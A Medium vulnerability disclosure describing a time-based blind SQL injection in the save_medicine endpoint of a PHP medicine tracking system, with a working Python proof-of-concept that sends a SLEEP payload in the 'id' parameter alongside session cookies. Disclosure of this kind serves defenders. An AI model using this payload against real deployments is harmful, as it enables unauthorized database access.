=== Content from medium.com_89e11789_20250114_234521.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F7b0dde3a82a4&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderUser&source=---top_nav_layout_nav----------------------------------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40heishou%2Fmedicine-tracking-system-sql-injection-7b0dde3a82a4&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40heishou%2Fmedicine-tracking-system-sql-injection-7b0dde3a82a4&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# Medicine Tracking System-SQL injection

[![heishou](https://miro.medium.com/v2/resize:fill:88:88/1*pR2bjEaLc11S00QyPXDWFA.png)](/%40heishou?source=post_page---byline--7b0dde3a82a4--------------------------------)

[heishou](/%40heishou?source=post_page---byline--7b0dde3a82a4--------------------------------)

·

[Follow](/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Ffc1fddf341cd&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40heishou%2Fmedicine-tracking-system-sql-injection-7b0dde3a82a4&user=heishou&userId=fc1fddf341cd&source=post_page-fc1fddf341cd--byline--7b0dde3a82a4---------------------post_header-----------)

2 min read·Dec 25, 2023

--

Listen

Share

Discoverer :heishou

manufacturers：<https://www.sourcecodester.com/>
Download at: <https://www.sourcecodester.com/sites/default/files/download/oretnom23/php-mts_0.zip>

Document overview
 Affected files: Master.php (especially save\_medicine function)
 Call point: manage\_medicine.php (triggered by Ajax request)
 vulnerability details
 Type: SQL Injection
 Location: Save\_medicine method in ‘Master.phMaster.php
 Data entry point: Ajax POST request to/php-mts/classes/Master.php? f=save\_medicine
 Key parameters: id, name, description
 Vulnerability Description: When processing Ajax requests, the save\_medicine function directly uses the parameters received for SQL query construction without parameterizing the query, resulting in potential SQL injection risk.

![]()

Exploits:

Tectonic POC

```
import requests
import time

# 目标URL
url = "http://localhost/php-mts/classes/Master.php?f=save_medicine"

# 构造恶意的POST数据
data = {
    'id': "' OR (SELECT 6647 FROM (SELECT(SLEEP(5)))VRGb)-- isuM",
    'name': 'qazxc',
    'description': 'adqmcooper'
}

# 包含提供的Cookie数据
cookies = {
    'USER_NAME_COOKIE': 'admin',
    'SID_1': 'aa141d36',
    'mailpoet_page_view': '%7B%22timestamp%22%3A1694409700%7D',
    'mailpoet_subscriber': '%7B%22subscriber_id%22%3A2%7D',
    '_ga': 'GA1.1.324136046.1702458922',
    'Hm_lvt_6a3c7d9bb52a48ffadde32007d2a259e': '1702459185',
    '_pk_id.1.1fff': '4343a030b8a53617.1702459185.',
    'PHPSESSID': 'rnl5etfht6ltq81aoghoshm8rt'
}

# 记录发送请求前的时间
start_time = time.time()

# 发送请求
response = requests.post(url, data=data, cookies=cookies)

# 记录发送请求后的时间
end_time = time.time()

# 输出响应时间
print(f"Response Time: {end_time - start_time} seconds")

# 如果响应时间显著长于5秒，则可能存在SQL注入漏洞
```
![]()![]()

--

--

[![heishou](https://miro.medium.com/v2/resize:fill:96:96/1*pR2bjEaLc11S00QyPXDWFA.png)](/%40heishou?source=post_page---post_author_info--7b0dde3a82a4--------------------------------)[![heishou](https://miro.medium.com/v2/resize:fill:128:128/1*pR2bjEaLc11S00QyPXDWFA.png)](/%40heishou?source=post_page---post_author_info--7b0dde3a82a4--------------------------------)Follow[## Written by heishou](/%40heishou?source=post_page---post_author_info--7b0dde3a82a4--------------------------------)[1 Follower](/%40heishou/followers?source=post_page---post_author_info--7b0dde3a82a4--------------------------------)·[3 Following](/%40heishou/following?source=post_page---post_author_info--7b0dde3a82a4--------------------------------)

Pretending to make you fly

Follow
## No responses yet

[Help](https://help.medium.com/hc/en-us?source=post_page-----7b0dde3a82a4--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----7b0dde3a82a4--------------------------------)[About](/about?autoplay=1&source=post_page-----7b0dde3a82a4--------------------------------)[Careers](/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----7b0dde3a82a4--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----7b0dde3a82a4--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----7b0dde3a82a4--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----7b0dde3a82a4--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----7b0dde3a82a4--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----7b0dde3a82a4--------------------------------)[Teams](/business?source=post_page-----7b0dde3a82a4--------------------------------)


